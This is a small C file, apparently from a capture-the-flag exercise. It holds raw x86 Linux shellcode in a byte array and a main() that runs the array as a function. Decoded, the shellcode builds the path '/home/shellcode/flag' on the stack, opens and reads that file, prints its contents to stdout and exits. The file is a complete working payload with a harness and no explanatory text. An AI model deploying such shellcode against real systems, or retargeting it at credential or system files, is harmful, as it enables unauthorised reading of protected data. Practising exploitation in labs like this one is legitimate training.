unsigned char code[] = {
	0x31, 0xc0, 0x31, 0xd2, 0x50, 0x68, 0x66, 0x6c, 0x61, 0x67, 0x68, 0x6f,
	0x64, 0x65, 0x2f, 0x68, 0x65, 0x6c, 0x6c, 0x63, 0x68, 0x65, 0x2f, 0x73,
	0x68, 0x68, 0x2f, 0x68, 0x6f, 0x6d, 0x89, 0xe3, 0xb0, 0x05, 0x31, 0xc9,
	0xcd, 0x80, 0x89, 0xc3, 0xb0, 0x03, 0x83, 0xec, 0x50, 0x89, 0xe1, 0xb2,
	0x50, 0xcd, 0x80, 0x89, 0xc2, 0x31, 0xdb, 0xb0, 0x04, 0xb3, 0x01, 0xcd,
	0x80, 0xb0, 0x01, 0x31, 0xdb, 0xcd, 0x80
};

int main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
	return 0;
}
